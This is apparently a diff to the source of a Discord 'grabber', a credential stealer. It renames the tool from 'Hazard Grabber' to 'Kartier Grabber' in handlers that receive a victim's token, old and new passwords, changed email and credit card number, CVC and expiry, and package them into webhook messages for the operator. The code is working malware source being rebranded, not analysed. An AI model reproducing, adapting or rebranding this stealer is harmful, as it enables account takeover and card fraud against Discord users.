@@ -182,7 +182,7 @@ function ChangePassword(oldpassword, newpassword, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
         var params = {
-            username: "Hazard Grabber",
+            username: "Kartier Grabber",
             content: "",
             avatar_url: "https://cdn.discordapp.com/attachments/857823662802468874/936508525557981264/ezgif-5-5cc2f16e09.gif",
             embeds: [
@@ -229,7 +229,7 @@ function ChangeEmail(newemail, password, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         var json = JSON.parse(info);
         var params = {
-            username: "Hazard Grabber",
+            username: "Kartier Grabber",
             content: "",
             avatar_url: "https://cdn.discordapp.com/attachments/857823662802468874/936508525557981264/ezgif-5-5cc2f16e09.gif",
             embeds: [
@@ -276,7 +276,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         var json = JSON.parse(info);
         var params = {
-            username: "Hazard Grabber",
+            username: "Kartier Grabber",
             content: "@everyone",
             avatar_url: "https://cdn.discordapp.com/attachments/857823662802468874/936508525557981264/ezgif-5-5cc2f16e09.gif",
             embeds: [
